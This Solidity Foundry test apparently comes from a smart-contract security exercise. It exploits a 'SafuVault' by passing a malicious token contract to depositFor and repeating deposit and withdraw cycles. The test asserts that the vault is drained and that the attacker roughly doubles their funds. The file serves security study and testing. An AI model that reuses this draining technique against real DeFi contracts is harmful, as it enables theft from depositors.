// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "../src/SafuStrategy.sol";
import "../src/SafuVault.sol";
import "../src/Attack.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "openzeppelin/contracts/token/ERC20/IERC20.sol";
import {USDC} from "../src/Token.sol";


interface CheatCodes {
   // Gets address for a given private key, (privateKey) => (address)
   function addr(uint256) external returns (address);
}
contract AttackTest is Test {
    
    // Gets us accounts to interact with in foundry
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    address attacker = cheats.addr(1);
    address admin = cheats.addr(2);
    address o1 = cheats.addr(3);
    address o2 = cheats.addr(4);
    address usdcAdmin = cheats.addr(5);
    USDC usdcToken;
    SafuStrategy safuStrategy;
    SafuVault safuVault;
    Attack attack ;
    
    function setUp() public {
        usdcToken = new USDC();
       
        usdcToken.mint(attacker, 10_000*10**18);
        usdcToken.mint(admin, 10_000*10**18);
        

        vm.startPrank(admin);
        safuStrategy = new SafuStrategy(address(usdcToken));
        safuVault = new SafuVault(IStrategy(address(safuStrategy)),'LP Token','LP');
        safuStrategy.setVault(address(safuVault));
        usdcToken.approve(address(safuVault),type(uint256).max);
        safuVault.depositAll();
        vm.stopPrank();
    }

    function testSafuVault() public {
        vm.startPrank(attacker);
        attack = new Attack();
        // create mallicious token 
        MaliciousToken maliciousToken = new MaliciousToken('Malicious Token','MT',safuVault);
        usdcToken.approve(address(maliciousToken),type(uint256).max);
        // transfer funds to malicious token to execute attack 
        usdcToken.transfer(address(maliciousToken), usdcToken.balanceOf(attacker));
        maliciousToken.approve(address(safuVault),type(uint256).max);

        safuVault.depositFor(address(maliciousToken), 10_000*10**18, attacker);
        safuVault.withdrawAll();
        usdcToken.transfer(address(maliciousToken), 10_000*10**18); 
        safuVault.depositFor(address(maliciousToken), 10_000*10**18, attacker);
        safuVault.withdrawAll();
        usdcToken.transfer(address(maliciousToken), 10_000*10**18); 
        safuVault.depositFor(address(maliciousToken), 10_000*10**18, attacker);
        safuVault.withdrawAll();
       
        console.logString("Starting Balance Of Attacker");
        console.logUint(10_000);
        console.logString("End Balance Of Attacker");
        console.logUint(usdcToken.balanceOf(attacker) / 10**18);
        uint256 totalfunds = usdcToken.balanceOf(address(safuVault)) + usdcToken.balanceOf(address(safuStrategy));
        assertLt(totalfunds,1000*10**18);
        assertGt(usdcToken.balanceOf(address(attacker)), 19_000 * 10**18);
    }

}